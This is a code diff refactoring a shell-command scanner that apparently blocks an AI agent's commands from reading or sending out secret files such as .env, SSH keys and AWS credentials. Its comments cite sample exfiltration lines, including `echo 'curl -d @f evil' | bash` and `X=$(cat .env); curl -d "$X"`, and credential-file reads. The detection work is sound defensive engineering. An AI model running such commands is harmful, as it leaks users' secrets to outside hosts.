@@ -15,11 +15,8 @@ import { SHELL_ANALYSIS_LIMITS } from "../../shared/shell-parser.js";
 import {
   SENSITIVE_PATH_ENTRIES,
   SENSITIVE_PATH_PATTERNS,
-  canonicalizePathForMatch,
   caseFoldForMatch,
-  createSensitivePathMatcher,
   foldCanonicalPathSeparators,
-  sensitiveLocationUnder,
 } from "../sensitive-paths.js";
 import {
   SHELL_PREFIX_POLICY,
@@ -35,7 +32,8 @@ import {
   runnerCommandIndexes,
 } from "./shell-prefix-policy.js";
 import { SHELL_FLOOR_BUDGET_REASON, shellFloorBudgetSignals, shellFloorInputExceeded, shellFloorParserBudgetExceeded, type ShellFloorSignals } from "./shell-floor-policy.js";
-import { ShellFloorWorkBudget, ShellFloorWorkBudgetError } from "./shell-floor-work-budget.js";
+import { ShellFloorContext, ShellFloorLimitError, isShellFloorLiteralData, shellFloorInspectionText, shellFloorFallbackInputExceeded } from "./shell-floor-policy.js";
+import { MAX_SHELL_ANALYSIS_TOKENS } from "../../shared/shell-analysis-limits.js";
 
 const PATH_READERS = new Set([
   "cat", "tac", "base64", "base32", "tar", "gzip", "bzip2", "xz", "zstd", "zip", "xxd", "od", "hexdump",
@@ -92,7 +90,16 @@ function substitutionBodies(word: ShellWord): ShellStatement[] {
   return bodies;
 }
 
+const statementCommands = new WeakMap<ShellStatement, ShellCommand[]>();
 function commandsIn(statement: ShellStatement): ShellCommand[] {
+  const cached = statementCommands.get(statement);
+  if (cached !== undefined) return cached;
+  const commands = commandList(statement);
+  statementCommands.set(statement, commands);
+  return commands;
+}
+
+function commandList(statement: ShellStatement): ShellCommand[] {
   switch (statement.kind) {
     case "command": return [statement];
     case "sequence": case "pipeline": return statement.statements.flatMap(commandsIn);
@@ -114,13 +121,13 @@ interface Context {
 }
 
 // Sink-only command views through transparent wrappers and opaque runners. A runner view is a conservative candidate, never an allow-rule boundary.
-function* commandCandidates(words: readonly ShellWord[], spend?: ScanWork): Generator<{ words: readonly ShellWord[]; name: string }> {
-  spend?.(words.length);
+function* commandCandidates(words: readonly ShellWord[]): Generator<{ words: readonly ShellWord[]; name: string }> {
+
   const argv = words.map(wordText);
   const seen = new Set<string>();
   const wrapper = wrapperCommand(argv);
   for (const index of new Set([wrapper.index, ...(wrapper.candidates ?? []), ...runnerCommandIndexes(argv)])) {
-    spend?.(words.length);
+
     const name = program(argv[index]);
     if (!name || seen.has(name)) continue;
     seen.add(name);
@@ -130,12 +137,12 @@ function* commandCandidates(words: readonly ShellWord[], spend?: ScanWork): Gene
 }
 
 // A command that reads a named path (a pipeline feeder or substitution body). A zero-word `$(<.env)` is bash's file-read shorthand.
-function readsPath(cmd: ShellCommand, spend?: ScanWork): boolean {
-  spend?.(cmd.words.length + cmd.redirects.length);
+function readsPath(cmd: ShellCommand): boolean {
+
   if (cmd.words.length === 0) {
     return cmd.redirects.some((redirect) => redirect.effect === "read" && redirect.target !== undefined);
   }
-  for (const { words, name } of commandCandidates(cmd.words, spend)) {
+  for (const { words, name } of commandCandidates(cmd.words)) {
     if (!PATH_READERS.has(name)) continue;
     if (cmd.redirects.some((redirect) => redirect.effect === "read" && redirect.target)) return true;
     if (words.slice(1).some((word) => {
@@ -155,13 +162,13 @@ function usesTainted(word: ShellWord, ctx: Context): boolean {
 // True when any word carries file data: a path-reading `$(…)` or a tainted variable.
 function bodiesReadPath(words: readonly ShellWord[], ctx: Context): boolean {
   if (words.some((word) => usesTainted(word, ctx))) return true;
-  ctx.scan.spend?.(words.length);
-  return words.flatMap(substitutionBodies).flatMap(commandsIn).some((command) => readsPath(command, ctx.scan.spend));
+
+  return words.flatMap(substitutionBodies).flatMap(commandsIn).some((command) => readsPath(command));
 }
 
 // Variables assigned from a file read anywhere in the command line (`X=$(cat.env); curl -d "$X" …`, `read X <.env`), to a fixed point so a copy (`Y=$X`) is tainted too.
 function collectTainted(root: ShellStatement, ctx: Context): void {
-  ctx.scan.spend?.(1, root.source.raw.length);
+
   const all = commandsIn(root);
   const nested = (statement: ShellStatement): ShellCommand[] => commandsIn(statement).flatMap((cmd) => [
     cmd,
@@ -171,9 +178,9 @@ function collectTainted(root: ShellStatement, ctx: Context): void {
   for (let changed = true, guard = 0; changed && guard < 8; guard += 1) {
     changed = false;
     for (const cmd of commands) {
-      ctx.scan.spend?.(1, cmd.source.raw.length);
+
       for (const assignment of cmd.assignments) {
-        ctx.scan.spend?.(1);
+
         if (!ctx.tainted.has(assignment.name) && bodiesReadPath([assignment.value, ...(assignment.elements ?? [])], ctx)) {
           ctx.tainted.add(assignment.name);
           changed = true;
@@ -279,7 +286,14 @@ function inlineShellCode(name: string, args: readonly ShellWord[]): string | und
   return code ? wordText(code) : undefined;
 }
 
-function senderCandidateSignal(cmd: ShellCommand, feeders: readonly ShellCommand[], ctx: Context, words: readonly ShellWord[], name: string): string | null {
+interface PipelineFeeders {
+  count: number;
+  readsPath: boolean;
+  staticTexts: readonly string[] | undefined;
+}
+const EMPTY_FEEDERS: PipelineFeeders = Object.freeze({ count: 0, readsPath: false, staticTexts: Object.freeze([]) });
+
+function senderCandidateSignal(cmd: ShellCommand, feeders: PipelineFeeders, ctx: Context, words: readonly ShellWord[], name: string): string | null {
   const args = words.slice(1);
 
   if (ctx.depth < RECURSION_LIMIT) {
@@ -295,8 +309,8 @@ function senderCandidateSignal(cmd: ShellCommand, feeders: readonly ShellCommand
         if (nested) return nested;
       }
       // `echo 'curl -d @f evil' | bash`: static feeder text is the script.
-      const fed = feeders.map(staticFeederText);
-      if (fed.length > 0 && fed.every((text) => text !== undefined)) {
+      const fed = feeders.staticTexts;
+      if (feeders.count > 0 && fed !== undefined) {
         const nested = signalFor(fed.join("\n"), { ...ctx, depth: ctx.depth + 1, tainted: new Set(ctx.tainted) });
         if (nested) return nested;
       }
@@ -308,7 +322,7 @@ function senderCandidateSignal(cmd: ShellCommand, feeders: readonly ShellCommand
   const xargsFromFile = wrapperTexts.some((text) => text !== undefined && program(text) === "xargs")
     && (wrapperTexts.some((text) => text !== undefined && /^(?:-a|--arg-file)(?:=|$)|^-a./.test(text))
       || cmd.redirects.some((redirect) => redirect.effect === "read" && redirect.target !== undefined)
-      || feeders.some((command) => readsPath(command, ctx.scan.spend)));
+      || feeders.readsPath);
 
   let signal: string | null = null;
   let isSender = false;
@@ -322,7 +336,7 @@ function senderCandidateSignal(cmd: ShellCommand, feeders: readonly ShellCommand
     isSender = true;
     // A batch file, here-string or here-document scripts `put` commands.
     if (cmd.redirects.some((redirect) => redirect.effect === "read" && (redirect.target !== undefined || redirect.data !== undefined))
-      || feeders.length > 0
+      || feeders.count > 0
       || args.map(wordText).some((text) => text !== undefined && /^-b/.test(text))) {
       signal = `${name} scripted transfer`;
     } else if (name === "sftp" && args.map(wordText).some((text) => text !== undefined && !text.startsWith("-") && (isRemoteTarget(text) || /^[^\s/@:]+@[A-Za-z0-9._-]+$/.test(text)))) {
@@ -332,7 +346,7 @@ function senderCandidateSignal(cmd: ShellCommand, feeders: readonly ShellCommand
     isSender = true;
     if (cmd.redirects.some((redirect) => redirect.effect === "read" && (redirect.target || (redirect.data && bodiesReadPath([redirect.data], ctx))))) {
       signal = `${name} fed from a file`;
-    } else if (feeders.some((command) => readsPath(command, ctx.scan.spend))) {
+    } else if (feeders.readsPath) {
       signal = `${name} fed from a file`;
     } else if (name === "socat" && args.map(wordText).some((text) => text !== undefined && /^(?:FILE|OPEN|GOPEN|EXEC|SYSTEM):/i.test(text))) {
       signal = "socat file or command address";
@@ -351,8 +365,8 @@ function senderCandidateSignal(cmd: ShellCommand, feeders: readonly ShellCommand
   return null;
 }
 
-function senderSignal(cmd: ShellCommand, feeders: readonly ShellCommand[], ctx: Context): string | null {
-  for (const { words, name } of commandCandidates(cmd.words, ctx.scan.spend)) {
+function senderSignal(cmd: ShellCommand, feeders: PipelineFeeders, ctx: Context): string | null {
+  for (const { words, name } of commandCandidates(cmd.words)) {
     const signal = senderCandidateSignal(cmd, feeders, ctx, words, name);
     if (signal) return signal;
   }
@@ -376,11 +390,11 @@ function senderSignal(cmd: ShellCommand, feeders: readonly ShellCommand[], ctx: 
   return null;
 }
 
-function walk(statement: ShellStatement, ctx: Context): string | null {
-  ctx.scan.spend?.(1, statement.source.raw.length);
+function walk(statement: ShellStatement, ctx: Context, feeders: PipelineFeeders = EMPTY_FEEDERS): string | null {
+
   switch (statement.kind) {
     case "command": {
-      const own = statement.words.length > 0 ? senderSignal(statement, [], ctx) : null;
+      const own = statement.words.length > 0 ? senderSignal(statement, feeders, ctx) : null;
       if (own) return own;
       const words = [
         ...statement.words,
@@ -394,17 +408,20 @@ function walk(statement: ShellStatement, ctx: Context): string | null {
       return null;
     }
     case "pipeline": {
-      const stages = statement.statements;
-      for (let index = 0; index < stages.length; index += 1) {
-        ctx.scan.spend?.(stages.length);
-        const stage = stages[index]!;
-        if (stage.kind === "command" && stage.words.length > 0) {
-          const feeders = stages.slice(0, index).flatMap(commandsIn);
-          const signal = senderSignal(stage, feeders, ctx);
-          if (signal) return signal;
-        }
-        const nested = walk(stage, ctx);
+      const texts: string[] = [];
+      const upstream: PipelineFeeders = { count: 0, readsPath: false, staticTexts: texts };
+      for (const stage of statement.statements) {
+        const nested = walk(stage, ctx, upstream);
         if (nested) return nested;
+        for (const command of commandsIn(stage)) {
+          upstream.count += 1;
+          upstream.readsPath ||= readsPath(command);
+          if (upstream.staticTexts !== undefined) {
+            const text = staticFeederText(command);
+            if (text === undefined) upstream.staticTexts = undefined;
+            else texts.push(text);
+          }
+        }
       }
       return null;
     }
@@ -466,44 +483,56 @@ function hasWildcard(segment: string): boolean {
   return segment.replace(/\uE000./gu, "").search(/[*?[]/) !== -1;
 }
 
-function segmentRegex(segment: string): RegExp {
-  let source = "";
+function segmentMatcher(segment: string): { test: (name: string) => boolean } {
+  const tokens: (string | RegExp | null)[] = [];
   for (let index = 0; index < segment.length; index += 1) {
     const char = segment[index]!;
-    if (char === GLOB_ESCAPE && index + 1 < segment.length) {
-      source += segment[index + 1]!.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
-      index += 1;
-    } else if (char === "*") source += ".*";
-    else if (char === "?") source += ".";
+    if (char === GLOB_ESCAPE && index + 1 < segment.length) tokens.push(segment[++index]!);
+    else if (char === "*") { if (tokens[tokens.length - 1] !== null) tokens.push(null); }
+    else if (char === "?") tokens.push(/^.$/);
     else if (char === "[") {
       const close = segment.indexOf("]", index + 2);
-      if (close === -1) { source += "\\["; continue; }
-      source += `[${segment.slice(index + 1, close).replace(/^!/, "^").replace(/[\\\]]/g, "\\$&")}]`;
-      index = close;
-    } else source += char.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+      if (close === -1) tokens.push("[");
+      else {
+        try { tokens.push(new RegExp(`^[${segment.slice(index + 1, close).replace(/^!/, "^").replace(/[\\\]]/g, "\\$&")}]$`)); }
+        catch { return { test: () => true }; }
+        index = close;
+      }
+    } else tokens.push(char);
   }
-  try {
-    return new RegExp(`^${source}$`);
-  } catch {
-    return /^.*$/;
-  }
+  const required = tokens.filter((token) => token !== null).length;
+  return { test(name) {
+    if (required > name.length) return false;
+    let previous = new Uint8Array(tokens.length + 1);
+    previous[0] = 1;
+    for (let index = 0; index < tokens.length && tokens[index] === null; index += 1) previous[index + 1] = 1;
+    for (const char of name) {
+      const next = new Uint8Array(tokens.length + 1);
+      for (let index = 0; index < tokens.length; index += 1) {
+        const token = tokens[index]!;
+        next[index + 1] = token === null ? (next[index]! || previous[index + 1]!)
+          : previous[index] && (typeof token === "string" ? token === char : token.test(char)) ? 1 : 0;
+      }
+      previous = next;
+    }
+    return previous[tokens.length] === 1;
+  } };
 }
 
 // The sensitive-table pattern a (possibly glob) path can reach, or null. Wildcard segments are instantiated with every sensitive name they match that exists in that directory (dot names only when the segment starts with `.`, as bash does without `dotglob`) plus one ordinary filler.
-type ScanWork = (steps: number, chars?: number) => void;
 
-// Generic path/glob work per decision terminates immediately on exhaustion.
+// A failed structural expansion is incomplete path evidence.
 const SHELL_PATH_SCAN_LIMITS = Object.freeze({ steps: 16_384, chars: 65_536 });
-class ShellScanBudgetError extends ShellFloorWorkBudgetError {}
+class ShellScanLimitError extends ShellFloorLimitError {}
 
-function sensitivePathHit(glob: string, cwd: string | undefined, dotglob: boolean, match: (path: string) => string | null, spend?: ScanWork, canonical = true, work?: ShellFloorWorkBudget): string | null {
-  spend?.(1, glob.length);
+function sensitivePathHit(glob: string, cwd: string | undefined, dotglob: boolean, match: (path: string) => string | null, canonical = true, work?: ShellFloorContext): string | null {
+
   if (!glob || glob === "-") return null;
-  const absolute = isAbsolute(glob) ? glob : resolve(cwd ?? "/", glob);
+  const absolute = resolve(cwd ?? "/", glob);
   if (!hasWildcard(absolute)) {
     const path = unescapeGlob(absolute);
-    spend?.(1, path.length);
-    return match(caseFoldForMatch(canonical ? canonicalFloorPath(path, work) : foldCanonicalPathSeparators(path)));
+
+    return match(caseFoldForMatch(canonical ? canonicalFloorPath(path, work, true) : foldCanonicalPathSeparators(path)));
   }
   const segments = absolute.split(/[\\/]/);
   // Whatever a wildcard expands to stays below its literal directory prefix:
@@ -512,26 +541,24 @@ function sensitivePathHit(glob: string, cwd: string | undefined, dotglob: boolea
   const firstWild = segments.findIndex(hasWildcard);
   if (firstWild > 0) {
     const prefix = unescapeGlob(segments.slice(0, firstWild).join("/")) || "/";
-    spend?.(1, prefix.length);
-    const hit = match(caseFoldForMatch(canonical ? canonicalFloorPath(prefix, work) : foldCanonicalPathSeparators(prefix)));
+
+    const hit = match(caseFoldForMatch(canonical ? canonicalFloorPath(prefix, work, true) : foldCanonicalPathSeparators(prefix)));
     if (hit) return hit;
   }
   let instances: string[][] = [[]];
   for (const segment of segments) {
-    spend?.(1, segment.length);
+
     const next: string[][] = [];
     const add = (parts: string[]): void => { next.push(parts); };
     for (const prefix of instances) {
-      spend?.(1);
+
       if (!hasWildcard(segment)) { add([...prefix, unescapeGlob(segment)]); continue; }
       if (segment === "**") add(prefix);
       // The shell expands a glob against the directory as it is: a sensitive name is reachable when it exists there (or when `**` may go deeper).
-      const pattern = segment === "**" ? /^/ : segmentRegex(segment);
+      const pattern = segment === "**" ? /^/ : segmentMatcher(segment);
       const dotAllowed = dotglob || segment.startsWith(".");
-      const wildcards = (segment.match(/\*/g) ?? []).length;
       for (const name of sensitiveNames()) {
-        // Reserve backtracking combinations before entering a pattern matcher.
-        spend?.((name.length + 1) ** wildcards, segment.length + name.length);
+
         if (!pattern.test(name) || (!dotAllowed && name.startsWith("."))) continue;
         if (!canonical || existsSync([...prefix, name].join("/") || "/")) add([...prefix, name]);
       }
@@ -539,15 +566,15 @@ function sensitivePathHit(glob: string, cwd: string | undefined, dotglob: boolea
       // directory's contents (`~/.ssh/*`) and a name-only pattern (`*/id_rsa`).
       if (segment !== "**") add([...prefix, unescapeGlob(segment.replace(/\[[^\]]*\]/g, "a").replace(/[*?]/g, "a"))]);
       if (next.length > GLOB_INSTANCE_LIMIT) {
-        spend?.(SHELL_PATH_SCAN_LIMITS.steps + 1);
-        throw new ShellScanBudgetError("Analysis budget exceeded");
+
+        throw new ShellScanLimitError("Shell glob expansion limit exceeded");
       }
     }
     instances = next;
   }
   for (const parts of instances) {
     // The ancestor walk charges each filesystem lookup when it occurs.
-    spend?.(1, parts.reduce((length, part) => length + part.length + 1, 0));
+
     const path = parts.join("/") || "/";
     const hit = match(caseFoldForMatch(canonical ? canonicalFloorPath(path, work) : foldCanonicalPathSeparators(path)));
     if (hit) return hit;
@@ -586,17 +613,17 @@ function argumentCandidates(glob: string): string[] {
 }
 
 // Bash brace expansion (`~/.{ssh,aws}/x`); a range (`{1..9}`) becomes a wildcard.
-function expandBraces(text: string, spend?: ScanWork): string[] {
-  spend?.(1, text.length);
+function expandBraces(text: string): string[] {
+
   for (let open = 0; open < text.length; open += 1) {
-    spend?.(1);
+
     if (text[open] === "\\") { open += 1; continue; }
     if (text[open] !== "{") continue;
     let depth = 0;
     let close = open;
     const commas: number[] = [];
     for (; close < text.length; close += 1) {
-      spend?.(1);
+
       const char = text[close];
       if (char === "\\") { close += 1; continue; }
       if (char === "{") depth += 1;
@@ -607,14 +634,14 @@ function expandBraces(text: string, spend?: ScanWork): string[] {
     const head = text.slice(0, open);
     const tail = text.slice(close + 1);
     if (commas.length === 0) {
-      if (text.slice(open + 1, close).includes("..")) return expandBraces(`${head}*${tail}`, spend);
+      if (text.slice(open + 1, close).includes("..")) return expandBraces(`${head}*${tail}`);
       continue;
     }
     const bounds = [open, ...commas, close];
     const out: string[] = [];
     for (let index = 0; index + 1 < bounds.length; index += 1) {
-      for (const expanded of expandBraces(head + text.slice(bounds[index]! + 1, bounds[index + 1]) + tail, spend)) {
-        spend?.(1);
+      for (const expanded of expandBraces(head + text.slice(bounds[index]! + 1, bounds[index + 1]) + tail)) {
+
         if (out.length >= BRACE_EXPANSION_LIMIT) return out;
         out.push(expanded);
       }
@@ -625,9 +652,9 @@ function expandBraces(text: string, spend?: ScanWork): string[] {
 }
 
 // Glob texts for shell text the AST did not lower (`~user/…`, `{a,b}`) or for a code token.
-function rawGlobs(raw: string, home: () => string, spend?: ScanWork): string[] {
-  spend?.(1, raw.length);
-  return expandBraces(rawGlobText(raw, home), spend);
+function rawGlobs(raw: string, home: () => string): string[] {
+
+  return expandBraces(rawGlobText(raw, home));
 }
 
 function rawGlobText(raw: string, home: () => string): string {
@@ -675,7 +702,7 @@ interface ScanState {
   // The command is a pipeline stage whose output an `xargs` stage turns into arguments.
   feedsXargs: boolean;
   // For an `xargs` pipeline stage, the stages before it, whose output becomes its arguments.
-  xargsUpstream?: readonly ShellStatement[];
+  xargsUpstream?: { commands: readonly ShellCommand[]; length: number; checked: Map<string, number> };
   // The command only lists names and metadata (`ls`, `du`, `stat`), so a glob whose expansion reaches a protected directory reads no store content.
   metadataListing: boolean;
   // Ask reason for a read the scan cannot bound but the OS floor confines: a metadata listing glob that expands into a protected directory, or a recursive reader fed static, ordinary roots through `xargs`. Like cdAsk it keeps path checks canonical.
@@ -690,61 +717,31 @@ interface ScanState {
   analysisLimited?: true;
   match: (path: string) => string | null;
   pathResults: Map<string, string | null>;
-  workBudget: ShellFloorWorkBudget;
-  spend?: ScanWork;
+  context: ShellFloorContext;
 }
 
-const floorCanonicalPaths = new WeakMap<ShellFloorWorkBudget, Map<string, string>>();
-
-function canonicalFloorPath(path: string, work?: ShellFloorWorkBudget): string {
-  if (!work) return canonicalizePathForMatch(path);
-  work.spend(1, path.length);
-  let results = floorCanonicalPaths.get(work);
-  if (!results) { results = new Map(); floorCanonicalPaths.set(work, results); }
-  const cached = results.get(path);
-  if (cached !== undefined) return cached;
-  const result = canonicalizePathForMatch(path, () => work.spend());
-  results.set(path, result);
-  return result;
+function canonicalFloorPath(path: string, context = new ShellFloorContext(), normalized = false): string {
+  return context.canonicalize(path, normalized);
 }
 
-const floorPathMatchers = new WeakMap<ShellFloorWorkBudget, (path: string) => string | null>();
-
-function createScanState(cwd: string | undefined, dotglob: boolean, spend?: ScanWork, command = "", workBudget = new ShellFloorWorkBudget()): ScanState {
-  const meter: ScanWork = spend ?? ((steps, chars) => workBudget.spend(steps, chars));
-  let matcher = floorPathMatchers.get(workBudget);
-  if (!matcher) {
-    workBudget.spend(SENSITIVE_PATH_PATTERNS.length);
-    const match = createSensitivePathMatcher("read", () => workBudget.spend());
-    const results = new Map<string, string | null>();
-    matcher = (path) => {
-      workBudget.spend(1, path.length);
-      if (results.has(path)) return results.get(path)!;
-      const result = match(path);
-      results.set(path, result);
-      return result;
-    };
-    floorPathMatchers.set(workBudget, matcher);
-  }
+function createScanState(cwd: string | undefined, dotglob: boolean, command = "", context = new ShellFloorContext()): ScanState {
   const state: ScanState = { cwds: [cwd], cwdUnknown: false, cwdVersion: 0, dirChanged: false,
     homeReassigned: HOME_REASSIGNMENT.test(command),
     cdRedirects: CD_REDIRECTION.test(command) || (process.env.CDPATH ?? "") !== "",
     functions: [], feedsXargs: false, metadataListing: false, dotglob, sensitive: null, network: false, hidden: false,
-    match: matcher, pathResults: new Map(), workBudget, spend: meter };
-  // zsh `autocd` turns any bare directory word into a `cd`.
+    match: (path) => context.matchPath(path), pathResults: new Map(), context };
   if (/auto_?cd/i.test(command)) markCwdUnknown(state, "autocd can change directory");
   return state;
 }
 
 function lexicalPathHit(glob: string, cwd: string | undefined, state: ScanState, braceExpansion: boolean): string | null {
-  const spend = state.spend;
   const globEvidence = hasWildcard(glob) || (braceExpansion && glob.includes("{"));
   if (globEvidence) {
-    const expanded = braceExpansion ? expandBraces(glob, spend) : [glob];
-    if (expanded.length >= BRACE_EXPANSION_LIMIT) throw new ShellScanBudgetError(SHELL_FLOOR_BUDGET_REASON);
+    const expanded = braceExpansion ? expandBraces(glob) : [glob];
+    if (expanded.length >= BRACE_EXPANSION_LIMIT) throw new ShellScanLimitError(SHELL_FLOOR_BUDGET_REASON);
     for (const candidate of expanded) {
-      spend?.(1, candidate.length);
-      const hit = sensitivePathHit(candidate, cwd, state.dotglob, state.match, spend, false, state.workBudget);
+
+      const hit = sensitivePathHit(candidate, cwd, state.dotglob, state.match, false, state.context);
       if (hit) return hit;
     }
     return null;
@@ -756,19 +753,20 @@ function lexicalPathHit(glob: string, cwd: string | undefined, state: ScanState,
 
 function checkGlob(glob: string, state: ScanState, braceExpansion = false): void {
   for (const candidate of argumentCandidates(glob)) {
-    state.spend?.(1, candidate.length);
+
     // A relative path names a location under every directory the command may be in.
-    for (const cwd of [...state.cwds]) {
-      state.spend?.(1, (cwd?.length ?? 0) + candidate.length);
+    for (const cwd of state.cwds) {
+
       if (state.sensitive) return;
       // Canonical nulls cannot answer the conservative, filesystem-free pass: a glob may reach a sensitive name whose existence was not established.
-      const resultKey = (): string => `${state.ordinaryAsk ? "lexical" : "canonical"}:${braceExpansion ? "brace" : "literal"}:${cwd ?? ""}\0${candidate}`;
-      if (state.pathResults.has(resultKey())) {
-        state.sensitive = state.pathResults.get(resultKey()) ?? null;
+      const resultKey = `${state.ordinaryAsk ? "lexical" : "canonical"}:${braceExpansion ? "brace" : "literal"}:${cwd ?? ""}\0${candidate}`;
+      const cached = state.pathResults.get(resultKey);
+      if (cached !== undefined) {
+        state.sensitive = cached;
       } else {
         state.sensitive = state.ordinaryAsk ? lexicalPathHit(candidate, cwd, state, braceExpansion)
-          : sensitivePathHit(candidate, cwd, state.dotglob, state.match, state.spend, true, state.workBudget);
-        state.pathResults.set(resultKey(), state.sensitive);
+          : sensitivePathHit(candidate, cwd, state.dotglob, state.match, true, state.context);
+        state.pathResults.set(resultKey, state.sensitive);
       }
       if (state.sensitive && state.metadataListing) confineListingGlob(candidate, cwd, state);
     }
@@ -785,7 +783,7 @@ function confineListingGlob(candidate: string, cwd: string | undefined, state: S
   const segments = absolute.split(/[\\/]/);
   const firstWild = segments.findIndex(hasWildcard);
   const prefix = unescapeGlob(segments.slice(0, Math.max(firstWild, 0)).join("/")) || "/";
-  if (state.match(caseFoldForMatch(canonicalFloorPath(prefix, state.workBudget)))) return;
+  if (state.match(caseFoldForMatch(canonicalFloorPath(prefix, state.context)))) return;
   state.confinedAsk ??= `listing glob expands into ${state.sensitive}`;
   state.sensitive = null;
 }
@@ -817,16 +815,16 @@ function scanEachHome(scan: (home: () => string) => void): void {
 }
 
 function checkRawText(raw: string, state: ScanState): void {
-  state.spend?.(1, raw.length);
+
   scanEachHome((home) => {
-    state.spend?.(1);
-    const globs = state.ordinaryAsk ? [rawGlobText(raw, home)] : rawGlobs(raw, home, state.spend);
-    for (const glob of globs) { state.spend?.(1); checkGlob(glob, state, true); }
+
+    const globs = state.ordinaryAsk ? [rawGlobText(raw, home)] : rawGlobs(raw, home);
+    for (const glob of globs) {  checkGlob(glob, state, true); }
   });
 }
 
 function checkWord(word: ShellWord, state: ScanState): void {
-  state.spend?.(1, word.source.raw.length);
+
   for (const part of word.parts) {
     if (part.kind === "substitution") scanStatement(part.body, state);
     else if (part.kind === "parameter-choice") checkWord(part.operand, state);
@@ -843,7 +841,7 @@ function checkWord(word: ShellWord, state: ScanState): void {
 
 // Path-like tokens inside code the matcher cannot parse (`open("/home/u/.ssh/id_rsa")`).
 function scanCodeText(text: string, state: ScanState): void {
-  state.spend?.(1, text.length);
+
   if (state.sensitive) return;
   const names = new Set(sensitiveNames());
   // Preserve brace-shaped path operands when no syntax tree is available.
@@ -861,14 +859,14 @@ function scanCodeText(text: string, state: ScanState): void {
 }
 
 // The sensitive-table pattern one path-like argument reaches, or null — for a quoted argument of non-bash code whose path holds spaces (`"…\User Data\Default\Login Data"`), which the token scan would split.
-export function sensitivePathInArgumentText(text: string, cwd: string | undefined, spend?: ScanWork, work = new ShellFloorWorkBudget()): string | null {
+export function sensitivePathInArgumentText(text: string, cwd: string | undefined, work = new ShellFloorContext()): string | null {
   if (shellFloorInputExceeded(text)) return SHELL_FLOOR_BUDGET_REASON;
   try {
-    const state = createScanState(cwd, false, spend, "", work);
+    const state = createScanState(cwd, false, "", work);
     checkRawText(text, state);
     return state.sensitive;
   } catch (error) {
-    if (error instanceof ShellFloorWorkBudgetError) return SHELL_FLOOR_BUDGET_REASON;
+    if (error instanceof ShellFloorLimitError) return SHELL_FLOOR_BUDGET_REASON;
     throw error;
   }
 }
@@ -887,11 +885,18 @@ function needsCodeTextScan(cmd: ShellCommand): boolean {
 }
 
 function scanCodeOf(cmd: ShellCommand, state: ScanState): void {
-  state.spend?.(cmd.words.length + cmd.redirects.length);
-  for (const word of cmd.words) scanCodeText(staticShellWord(word) ?? word.source.raw, state);
+  for (const word of cmd.words) scanWordCodeText(word, state);
   for (const redirect of cmd.redirects) {
-    if (redirect.data) scanCodeText(staticShellWord(redirect.data) ?? redirect.data.source.raw, state);
+    if (redirect.data && !isShellFloorLiteralData(redirect.data)) scanCodeText(staticShellWord(redirect.data) ?? redirect.data.source.raw, state);
   }
+}
+
+// A parsed plain word already receives its complete path check. Only a word
+// containing code/text boundaries can expose additional embedded path tokens.
+function scanWordCodeText(word: ShellWord, state: ScanState): void {
+  if (isShellFloorLiteralData(word)) return;
+  const text = staticShellWord(word);
+  if (text === undefined || /[\s'"`;|&()<>{}\[\]=:+]/.test(text)) scanCodeText(text ?? word.source.raw, state);
 }
 
 function scanRedirectTarget(target: ShellWord, state: ScanState): void {
@@ -1110,23 +1115,23 @@ function sensitiveSymlinkUnder(root: string, state: ScanState): string | null {
   const pending = [root];
   let entries = 0;
   while (pending.length > 0) {
-    state.spend?.(1);
+
     const directory = pending.pop()!;
     let children: import("node:fs").Dirent[];
     try { children = readdirSync(directory, { withFileTypes: true }); } catch { continue; }
     for (const child of children) {
-      state.spend?.(1, child.name.length);
+
       entries += 1;
       if (entries > SYMLINK_SCAN_ENTRY_LIMIT) return `symlink-following search of ${root} too large to rule out a link to a sensitive path`;
       const path = join(directory, child.name);
       if (child.isSymbolicLink()) {
-        state.spend?.(1, path.length);
+
         let target: string;
-        try { target = caseFoldForMatch(canonicalFloorPath(realpathSync(path), state.workBudget)); } catch (error) {
-          if (error instanceof ShellFloorWorkBudgetError) throw error;
+        try { target = caseFoldForMatch(canonicalFloorPath(realpathSync(path), state.context)); } catch (error) {
+          if (error instanceof ShellFloorLimitError) throw error;
           continue;
         }
-        const hit = state.match(target) ?? sensitiveLocationUnder(target);
+        const hit = state.match(target) ?? state.context.locationUnder(target);
         if (hit) return `symlink ${path} reaches ${hit}`;
         // A link to a directory is walked through its target by the search.
         try { if (statSync(path).isDirectory()) pending.push(path); } catch { /* dangling link */ }
@@ -1140,7 +1145,7 @@ function sensitiveSymlinkUnder(root: string, state: ScanState): string | null {
 
 // A recursive `grep`/`rg` reads every file below its roots, so the floor covers a root at or above a secret-holding directory (`grep -r x ~`, `rg --hidden x /`). For any search that follows symlinks (GNU `grep -R`, BSD `grep -S`, `rg -L`, `find -L`/`-follow`/`-H`) it also covers a followed link that resolves into one. `find` alone only lists names, like `ls -R`.
 function scanRecursiveSearch(cmd: ShellCommand, state: ScanState): void {
-  state.spend?.(1, cmd.source.raw.length);
+
   if (state.sensitive) return;
   const fullArgv = commandArgv(cmd);
   // Look through transparent wrappers (`sudo`, `env -C`, `nice`, `xargs`).
@@ -1187,7 +1192,7 @@ function scanRecursiveSearch(cmd: ShellCommand, state: ScanState): void {
     roots.push(".");
   }
   for (const root of roots) {
-    state.spend?.(1, root.length);
+
     if (!isAbsolute(root) && state.cwdUnknown) {
       // After a `cd` to an unknown directory a relative root may be the home or any directory above a secret store; it cannot be ruled out.
       state.sensitive = `recursive search of ${root} after a cd whose target is not static`;
@@ -1195,7 +1200,7 @@ function scanRecursiveSearch(cmd: ShellCommand, state: ScanState): void {
     }
     // Without a working directory a relative root names no location; the decision path always supplies one.
     for (const cwd of isAbsolute(root) ? [undefined] : state.cwds.filter((dir) => dir !== undefined)) {
-      state.spend?.(1, cwd?.length ?? 0);
+
       searchRoot(isAbsolute(root) ? root : resolve(cwd!, root), shape, state);
       if (state.sensitive) return;
     }
@@ -1207,21 +1212,23 @@ function xargsUpstreamReach(state: ScanState): string | null {
   if (state.cwdUnknown) return "a stage after a cd whose target is not static";
   const cwds = state.cwds.filter((dir): dir is string => dir !== undefined);
   const reaches = (absolute: string): string | null => {
-    state.spend?.(1, absolute.length);
-    const canonical = caseFoldForMatch(canonicalFloorPath(absolute, state.workBudget));
-    const hit = state.match(canonical) ?? sensitiveLocationUnder(canonical);
+
+    const canonical = caseFoldForMatch(canonicalFloorPath(absolute, state.context));
+    const hit = state.match(canonical) ?? state.context.locationUnder(canonical);
     return hit ? `${absolute} (reaches ${hit})` : null;
   };
   for (const cwd of cwds) {
-    state.spend?.(1);
+
     const hit = reaches(cwd);
     if (hit) return hit;
   }
